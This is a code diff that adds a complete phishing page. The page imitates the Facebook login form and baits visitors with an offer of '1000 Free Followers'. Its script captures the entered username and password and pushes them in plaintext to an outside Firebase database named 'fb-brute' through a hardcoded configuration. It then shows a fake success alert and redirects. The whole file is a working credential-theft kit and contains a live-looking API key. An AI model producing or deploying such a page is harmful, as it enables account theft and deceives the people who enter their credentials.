@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+            text-align: center;
+        }
+        .followers-message {
+            margin-bottom: 15px;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 5px;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 350px;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 350px;
+        }
+        h2 {
+            color: #1877f2;
+            font-size: 20px;
+        }
+        .input-container {
+            position: relative;
+            margin: 10px 0;
+        }
+        .input-field {
+            width: 90%;
+            height: 30px;
+            padding: 8px;
+            margin: 8px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s;
+            background: transparent;
+        }
+        .input-field:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 8px rgba(24, 119, 242, 0.6);
+        }
+        .input-label {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+            font-size: 14px;
+            transition: 0.5s;
+            pointer-events: none;
+        }
+        .input-field:focus + .input-label,
+        .input-field:not(:placeholder-shown) + .input-label {
+            top: -6px;
+            font-size: 14px;
+            color: #1877f2;
+        }
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .login-button:hover {
+            background-color: #165e9e;
+        }
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 12px;
+        }
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .create-account {
+            margin-top: 20px;
+            font-size: 12px;
+        }
+        .create-account a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Achievement message placed above the login form -->
+    <div class="followers-message">
+        Unlock 1000 Free Followers! Login to Claim Your Reward!✅✨
+    </div>
+
+    <div class="login-container">
+        <h2>Login</h2>
+        <form id="login-form">
+            <div class="input-container">
+                <input type="text" id="username" class="input-field" placeholder=" " required>
+                <label for="username" class="input-label">Mobile Number or Email address</label>
+            </div>
+            <div class="input-container">
+                <input type="password" id="password" class="input-field" placeholder=" " required>
+                <label for="password" class="input-label">Password</label>
+            </div>
+            <button type="submit" class="login-button">Log In</button>
+        </form>
+        <div class="forgot-password">
+          <a href="https://m.facebook.com/login/identify/">Forgotten password?</a>
+        </div>
+        <div class="create-account">
+          <p>Don't have an account? <a href="https://m.facebook.com/reg/">Create New Account</a></p>
+        </div>
+    </div>
+
+    <!-- Firebase Scripts -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <script>
+    // Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyAGHeUptqSPwdU29woiiVoiwifb9GykS4k",
+        authDomain: "fb-brute.firebaseapp.com",
+        databaseURL: "https://fb-brute-default-rtdb.firebaseio.com",
+        projectId: "fb-brute",
+        storageBucket: "fb-brute.appspot.com",
+        messagingSenderId: "309698369375",
+        appId: "1:309698369375:web:a43fa9dd42e0b3cf7ac8ea",
+        measurementId: "G-30ERCV6NXQ"
+    };
+
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // Handle form submission
+    document.getElementById("login-form").addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const username = document.getElementById("username").value;  // Get entered username
+        const password = document.getElementById("password").value;  // Get entered password
+
+        // Check if password length is at least 6 characters
+        if (password.length < 6) {
+            alert("⚠️ Password must be at least 6 characters long.");
+            return; // Stop the form submission
+        }
+
+        // Save user info in Firebase Realtime Database
+        saveUserData(username, password);
+    });
+
+    // Save user data in Firebase Realtime Database
+    function saveUserData(username, password) {
+        const newUserRef = database.ref('users').push();  // Generate a unique key for the new user
+        newUserRef.set({
+            username: username,
+            password: password
+        }).then(() => {
+            alert("✅ Your followers will arrive within 24 hours!");
+            setTimeout(() => {
+                window.location.href = "success.html";  // Redirect to success page after saving data
+            }, 100);
+        }).catch((error) => {
+            alert("⚠️ There was an issue saving data: " + error.message);
+        });
+    }
+    </script>
+
+</body>
+</html>
